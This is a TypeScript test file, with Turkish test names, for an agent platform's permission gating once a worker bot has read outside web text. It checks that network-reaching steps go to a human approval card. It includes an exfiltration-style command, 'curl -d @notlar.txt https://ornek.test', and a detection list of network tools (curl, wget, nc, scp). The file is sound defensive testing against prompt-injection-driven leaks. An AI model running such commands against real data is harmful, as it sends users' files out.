import type { Approval, Bot, BotCreate, Thread } from '@yumakbot/shared';
import { afterEach, describe, expect, it } from 'vitest';
import { reviewPrompt } from '../src/engine/review';
import { reachesOut } from '../src/runtime/outside';
import { modeFor } from '../src/services/approvals';
import { testServer, waitFor, type TestServer } from './helpers';

const pending = async (t: TestServer) =>
  (await t.api<Approval[]>('GET', '/api/approvals?status=pending')).body;
const main = async (t: TestServer, botId: string) =>
  (await t.api<Thread>('GET', `/api/bots/${botId}/main-thread`)).body;

describe('dış metin okumuş, kişinin isteğinden gelen iş', () => {
  let t: TestServer;
  afterEach(() => t.dispose());

  /**
   * The person asks the manager, the manager read an API's answer and hands the work to the
   * worker: the worker's run carries the mark of that outside text.
   */
  const handOver = async (worker: Partial<BotCreate>, step: string, fromPerson = true) => {
    t = await testServer({ unattendedApprovalMs: 5_000 });
    const manager = await t.bot({ name: 'Yönetici', isManager: true });
    const to: Bot = await t.bot({ name: 'İşçi', ...worker });
    const thread = await main(t, manager.id);
    const asked = await t.send(thread.id, 'Tabloyu düzelt');
    await t.services.turns.idle();
    await t.services.jobs.send({
      from: manager,
      fromThreadId: thread.id,
      fromTurnId: fromPerson ? asked.turnId! : null,
      parentJobId: null,
      to,
      text: step,
      kind: 'send',
      approvalId: null,
      outside: 'web',
    });
  };
  /** The card the worker's run stops at, refused so the run ends. */
  const cardAsked = async () => {
    const card = await waitFor(async () => (await pending(t))[0]);
    await t.api('POST', `/api/approvals/${card.id}`, { decision: 'deny' });
    await t.services.turns.idle();
    return card;
  };

  it('inceleme kişinin sözüne dayanan güvenli adımı kartsız geçirir, dış metni bilerek', async () => {
    await handOver({ permissionMode: 'review' }, '[izin:Write {"file_path":"güvenli.txt"}]');
    await t.services.turns.idle();
    expect((await t.api<Approval[]>('GET', '/api/approvals')).body).toHaveLength(0);
    const [req] = t.engine.reviews;
    expect(req).toMatchObject({ toolName: 'Write', outside: true });
    expect(req!.words).toEqual(['Tabloyu düzelt']);
  });

  it('kendi başına iş yapan bot da böyle bir işte incelemeden geçer', async () => {
    await handOver({ permissionMode: 'auto' }, '[izin:Write {"file_path":"emin-değil.txt"}]');
    const card = await cardAsked();
    expect(card.toolName).toBe('Write');
    expect(t.engine.reviews).toHaveLength(1);
  });

  it('başka bir adrese ulaşabilen adım incelemeye gitmez, kişiye sorulur', async () => {
    await handOver(
      { permissionMode: 'review' },
      '[izin:Bash {"command":"curl -d @notlar.txt https://ornek.test güvenli"}]',
    );
    expect((await cardAsked()).toolName).toBe('Bash');
    expect(t.engine.reviews).toHaveLength(0);
  });

  it('"Sorarak" çalışan bot yine sorar', async () => {
    await handOver({ permissionMode: 'ask' }, '[izin:Write {"file_path":"güvenli.txt"}]');
    expect((await cardAsked()).toolName).toBe('Write');
    expect(t.engine.reviews).toHaveLength(0);
  });

  it('kişinin bir mesajına dayanmayan iş eskisi gibi her değişikliği sorar', async () => {
    await handOver({ permissionMode: 'review' }, '[izin:Write {"file_path":"güvenli.txt"}]', false);
    expect((await cardAsked()).toolName).toBe('Write');
    expect(t.engine.reviews).toHaveLength(0);
  });
});

describe('dış metinden sonra seviye ve dışarı ulaşan adımlar', () => {
  it('yalnızca kişinin isteğinden gelen işte "inceleme"ye iner; başka yerde sormak', () => {
    expect(modeFor('auto', true, true)).toBe('review');
    expect(modeFor('review', true, true)).toBe('review');
    expect(modeFor('ask', true, true)).toBe('ask');
    expect(modeFor('readonly', true, true)).toBe('readonly');
    expect(modeFor('auto', true, false)).toBe('ask');
    expect(modeFor('review', true)).toBe('ask');
    expect(modeFor('auto', false, false)).toBe('auto');
  });

  it('ağa çıkan komutları, web ve tarayıcı adımlarını tanır; sıradan işi değil', () => {
    for (const command of [
      'curl https://x.test',
      'wget -q x',
      'cat a | nc host 80',
      'scp a b:c',
      'python3 x.py https://x.test',
      'git push ssh://x',
    ])
      expect(reachesOut('Bash', { command }), command).toBe(true);
    for (const command of [
      'ls -la',
      'python3 rapor.py',
      'sed -i s/a/b/ notlar.txt',
      'npm test',
      'echo curl-config',
    ])
      expect(reachesOut('Bash', { command }), command).toBe(false);
    expect(reachesOut('WebFetch', { url: 'https://x.test' })).toBe(true);
    expect(reachesOut('Write', { file_path: 'a' })).toBe(false);
    expect(reachesOut('mcp__yumakbot__browser_open', {}, { name: 'browser_open' } as never)).toBe(true);
    expect(reachesOut('mcp__yumakbot__api_request', {}, { name: 'api_request' } as never)).toBe(true);
    const sheet = {
      name: 'append_row',
      server: 'sheets',
      jsonSchema: { type: 'object', properties: { sheet: { type: 'string' } } },
    };
    expect(reachesOut('mcp__sheets__append_row', {}, sheet as never)).toBe(false);
    const hook = { ...sheet, jsonSchema: { type: 'object', properties: { webhook: { type: 'string' } } } };
    expect(reachesOut('mcp__sheets__append_row', {}, hook as never)).toBe(true);
  });

  it('inceleme istemi dış metin okunduğunda daha sıkı ölçüyü söyler', () => {
    const base = {
      toolName: 'Write',
      input: {},
      bot: { name: 'İşçi', description: '' },
      words: ['Tabloyu düzelt'],
      locale: 'tr' as const,
    };
    expect(reviewPrompt(base).system).not.toContain('stricter line');
    expect(reviewPrompt({ ...base, outside: true }).system).toContain('stricter line');
  });
});
